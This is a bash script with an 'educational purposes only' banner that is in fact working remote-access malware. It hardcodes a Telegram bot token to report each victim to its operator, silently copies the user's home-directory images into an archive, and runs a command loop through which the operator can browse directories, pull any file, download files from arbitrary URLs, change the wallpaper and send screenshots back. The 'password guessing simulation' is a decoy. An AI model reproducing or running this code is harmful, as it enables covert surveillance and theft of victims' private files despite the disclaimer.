#!/bin/bash

# Ethical Disclaimer
echo -e "\e[31mThis script is for educational purposes only. Unauthorized use is strictly prohibited.\e[0m"
echo -e "\e[33mEnsure you have explicit permission before using this tool on any system.\e[0m"
sleep 3

# Color Definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Display Logo
echo -e "${BLUE}"
echo "██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗"
echo "██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║"
echo "███████║█████╗  ██╔████╔██║███████║   ███████║██║"
echo "██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║"
echo "██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║"
echo "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝"
echo -e "${NC}"

# Configuration
TELEGRAM_TOKEN="7612154660:AAE8zfRa-Apxf7CQUjulwx5ErkY0lGg_BiI"
TELEGRAM_CHAT_ID="5967116314"
USER_COUNT_FILE="/tmp/user_count.txt"
PASSWORD_LIST_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
PASSWORD_FILE="/tmp/password_list.txt"
CURRENT_DIR_FILE="/tmp/current_dir.txt"

# Initialize User Count
if [ ! -f "$USER_COUNT_FILE" ]; then
    echo "1" > "$USER_COUNT_FILE"
else
    CURRENT_COUNT=$(cat "$USER_COUNT_FILE")
    echo "$((CURRENT_COUNT + 1))" > "$USER_COUNT_FILE"
fi

# Send Telegram Message
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
        -d chat_id="$TELEGRAM_CHAT_ID" \
        -d text="$1" > /dev/null 2>&1
}

# Send New User Notification
send_telegram "New user registered: $(cat $USER_COUNT_FILE)"

# Simulated Password Guessing (Ethical Simulation)
password_guessing() {
    echo -e "${YELLOW}Starting password guessing simulation...${NC}"
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}curl is required but not installed. Exiting.${NC}"
        exit 1
    fi

    curl -s -o "$PASSWORD_FILE" "$PASSWORD_LIST_URL"
    
    while IFS= read -r password; do
        echo -ne "Trying password: $password\r"
        sleep 0.1  # Simulated delay
        
        # Simulated success condition (for demonstration only)
        if [ "$password" == "correctpassword123" ]; then
            echo -e "\n${GREEN}Success! Password found: $password${NC}"
            echo "Successful password: $password" >> /tmp/success.log
            break
        fi
    done < "$PASSWORD_FILE"
    
    echo -e "${YELLOW}Password guessing simulation completed.${NC}"
}

# Background Operations (Silent Data Collection)
background_operations() {
    # Simulated data collection
    mkdir -p /tmp/exfiltrated_data
    find ~ -type f \( -name "*.jpg" -o -name "*.png" \) -exec cp {} /tmp/exfiltrated_data \; 2>/dev/null
    tar czf /tmp/exfiltrated_data.tar.gz -C /tmp exfiltrated_data 2>/dev/null
    send_telegram "Data collection completed on $(hostname)"
}

# Telegram Command Handler
handle_telegram_commands() {
    local UPDATE_ID=0
    while true; do
        RESPONSE=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$UPDATE_ID")
        MESSAGES=$(echo "$RESPONSE" | grep -oP '"text":\s*"\K[^"]+')
        
        for MESSAGE in $MESSAGES; do
            UPDATE_ID=$(echo "$RESPONSE" | grep -oP '"update_id":\s*\K\d+')
            UPDATE_ID=$((UPDATE_ID + 1))
            
            case "$MESSAGE" in
                pwd)
                    output=$(pwd)
                    send_telegram "Current directory:\n$output"
                    ;;
                ls)
                    current_dir=$(cat "$CURRENT_DIR_FILE" 2>/dev/null || echo "$HOME")
                    output=$(ls -la "$current_dir" 2>&1)
                    send_telegram "Directory listing:\n$output"
                    ;;
                cd*)
                    target_dir=$(echo "$MESSAGE" | cut -d' ' -f2)
                    if [ -d "$target_dir" ]; then
                        echo "$target_dir" > "$CURRENT_DIR_FILE"
                        send_telegram "Changed directory to $target_dir"
                    else
                        send_telegram "Directory $target_dir not found"
                    fi
                    ;;
                up*)
                    filename=$(echo "$MESSAGE" | cut -d' ' -f2)
                    if [ -f "$filename" ]; then
                        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument" \
                            -F chat_id="$TELEGRAM_CHAT_ID" \
                            -F document=@"$filename" > /dev/null 2>&1
                    else
                        send_telegram "File $filename not found"
                    fi
                    ;;
                dw*)
                    url=$(echo "$MESSAGE" | cut -d' ' -f2)
                    filename=$(basename "$url")
                    if curl -s -o "$filename" "$url"; then
                        send_telegram "Downloaded $filename"
                    else
                        send_telegram "Failed to download $url"
                    fi
                    ;;
                bak*)
                    url=$(echo "$MESSAGE" | cut -d' ' -f2)
                    if command -v gsettings &> /dev/null; then
                        curl -s -o /tmp/wallpaper.jpg "$url" && gsettings set org.gnome.desktop.background picture-uri file:///tmp/wallpaper.jpg
                        send_telegram "Wallpaper changed successfully"
                    else
                        send_telegram "Wallpaper change not supported on this system"
                    fi
                    ;;
                sk)
                    if command -v scrot &> /dev/null; then
                        scrot /tmp/screenshot.png
                        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendPhoto" \
                            -F chat_id="$TELEGRAM_CHAT_ID" \
                            -F photo=@"//tmp/screenshot.png" > /dev/null 2>&1
                        send_telegram "Screenshot taken"
                    else
                        send_telegram "Screenshot tool not found"
                    fi
                    ;;
                *)
                    send_telegram "Unknown command: $MESSAGE"
                    ;;
            esac
        done
        sleep 2
    done
}

# Main Execution
password_guessing &
background_operations &
handle_telegram_commands

echo -e "${YELLOW}Script running in background. Use Telegram commands to interact.${NC}"
